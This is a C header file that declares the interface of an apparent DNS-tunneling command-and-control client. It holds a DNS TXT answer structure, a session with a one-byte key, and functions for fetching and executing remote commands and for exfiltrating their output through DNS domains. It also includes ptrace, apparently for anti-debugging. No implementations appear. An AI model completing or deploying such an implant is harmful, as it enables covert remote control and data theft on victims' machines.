#ifndef CLIENT_H
#define CLIENT_H

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/ptrace.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <arpa/nameser.h>
#include <resolv.h>

#define BUFFER_SIZE 1024
#define COMMANDS_COUNT 5
#define DELAY_TIME 30
#define MAX_OUTPUT_SIZE 32

struct __attribute__((__packed__)) dns_answer {
    unsigned short magic;
    unsigned short type;
    unsigned short class;
    unsigned int ttl;
    unsigned short size;
    unsigned char txt_size;
    char data[BUFFER_SIZE];
};

struct session {
    int sockfd;
    struct sockaddr_in servaddr;
    char *session;
    unsigned char key;
};

char * load_string(unsigned int idx);

unsigned char * make_dns_request(char *domain, size_t * size, int should_receive);

void handle_command_fetching(int pipefd);

void handle_command_execution(int pipefd);

char * cmd_domain(unsigned int i);

char * exfiltrate_domain (char *data);

void send_command_output(char *output, size_t size);

void execute_command(char *command);

#endif